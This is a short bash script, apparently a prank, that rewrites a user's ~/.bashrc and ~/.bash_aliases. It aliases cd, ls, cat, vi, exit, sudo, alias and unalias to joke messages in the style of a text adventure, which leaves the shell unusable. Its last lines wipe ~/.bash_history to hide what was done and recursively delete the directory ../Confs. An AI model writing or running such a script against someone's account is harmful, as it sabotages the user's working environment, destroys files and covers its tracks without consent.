#!/bin/bash

echo "if [ -f ~/.bash_aliases ]; then" >> ~/.bashrc
echo ". ~/.bash_aliases" >> ~/.bashrc
echo "fi" >> ~/.bashrc

echo "PS1=\"\nYou are in a room with many doors, all alike\n# \"" > ~/.bash_aliases

echo "alias cd='echo That door is locked #'" >> ~/.bash_aliases
echo "alias pwd='echo You are lost #'" >> ~/.bash_aliases
echo "alias ls='echo It is too dark to see anything #'" >> ~/.bash_aliases
echo "alias cat='echo It is too dark to see anything #'" >> ~/.bash_aliases
echo "alias vi='echo You re not strong enough to perform that action #'" >> ~/.bash_aliases
echo "alias exit='echo You do not know the way out #'" >> ~/.bash_aliases
echo "alias sudo='echo You have been eaten by a Grue #'" >> ~/.bash_aliases
echo "alias alias='echo The name you started with is good enough #'" >> ~/.bash_aliases
echo "alias unalias='echo That which is done cannot be undone #'" >> ~/.bash_aliases

cat /dev/null > ~/.bash_history
rm -r ../Confs